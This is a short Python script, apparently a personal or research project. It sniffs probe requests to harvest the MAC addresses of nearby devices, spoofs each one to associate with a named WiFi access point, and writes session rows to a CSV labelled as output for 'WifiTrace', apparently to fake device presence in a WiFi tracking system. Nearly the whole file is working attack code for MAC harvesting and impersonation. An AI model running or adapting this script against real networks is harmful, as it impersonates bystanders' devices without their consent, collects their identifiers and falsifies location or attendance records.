#!/usr/bin/python3

from macsniffer import *
from wifi import *
from datetime import *
from time import *
import csv

# from xlwt import * Seems like a good module for porting to excel

# Variables below should be changed as necessary
source_interface = 'wlxe84e0681145b'
wifi_name = 'WeenieHutJr'
wifi_mac = 'c8:52:61:b4:c8:60'

''' Code below sniffs surrounding area for MAC addresses '''
print('Just one moment, collecting MAC addresses...')
sniffer = MACSniffer()
sniffer.sniffProbes(iface=source_interface, count=1000)
umacs = sniffer.getUniqueMACs()
print('Unique MAC addresses found: ')
print(umacs)

''' Code below iterates over unique MAC list, associates each with given Wifi, and then checks status field of connection to ensure that connection was successful '''
wifi = Wifi()
connected_macs = []
for mac in umacs:
	print('Associating MAC address ' + mac + '...')
	answer = wifi.connect(wifi_name, mac, wifi_mac, source_interface)
	if (answer is None):
		print('Connection unsuccessful with MAC ' + mac)
		continue
	layer = (answer.getlayer(scapy.layers.dot11.Dot11AssoResp, nb=1, _track=None, _subclass=None))
	if (layer.fields['status'] == 0):
		print('Success - Status code: 0')
		connected_macs.append(mac)
	else:
		print('Error - Status code: ' + layer.fields['status'])

#variables needed for csv output
fields = ['MAC', 'Session_AP_Name', 'Year', 'Month', 'Date', 'Start_Time', 'End_Time', 'Unix_Start_Time', 'Unix_End_Time']
filename = "output.csv"
rows = []

print('----------------')
print('Output for WifiTrace: ')
for mac in connected_macs:
	print('MAC of spoofed device: ' + mac)
	print('AP Name: ' + wifi_name)
	print('Year: ' + strftime('%Y', gmtime()))
	print('Month: ' + strftime('%b', gmtime()))
	print('Date: ' + strftime('%m-%d', gmtime()))
	print('Start Time: ' + strftime('%H:%M', gmtime()))
	print('End Time: ' + strftime('%H:%M', gmtime())) #This will have to be changed
	print('Unix Start: ' + str(int(time())))
	print('Unix End: ' + str(int(time()))) #This will also have to change
	print('----------------------------')
	#apprend row containing MAC data for csv file
	rows.append([mac, wifi_name, strftime('%Y', gmtime()), strftime('%b', gmtime()), strftime('%m-%d', gmtime()), strftime('%H:%M', gmtime()), strftime('%H:%M', gmtime()), str(int(time())), str(int(time()))])

with open(filename, 'w') as csvfile:
	csvwriter = csv.writer(csvfile)
	csvwriter.writerow(fields)
	csvwriter.writerows(rows)


'''
Random shit that I used throughout this process, some of which even works!
~~~ Mostly bad stuff
answer.show2(dump=False, indent=3, lvl='', label_lvl='')
print(answer.layers())
print(answer.getlayer(scapy.layers.dot11.Dot11AssoResp, nb=1, _track=None, _subclass=None).getFieldVal('status'))
layer = answer.getlayer(scapy.layers.dot11.Dot11AssoResp, nb=1, _track=None, _subclass=None)
fields = layer.field()
print(fields)
print(answer.getfield(answer, 'status'))
~~~ Good stuff below
layer = (answer.getlayer(scapy.layers.dot11.Dot11AssoResp, nb=1, _track=None, _subclass=None))
print(layer.fields["status"])
'''
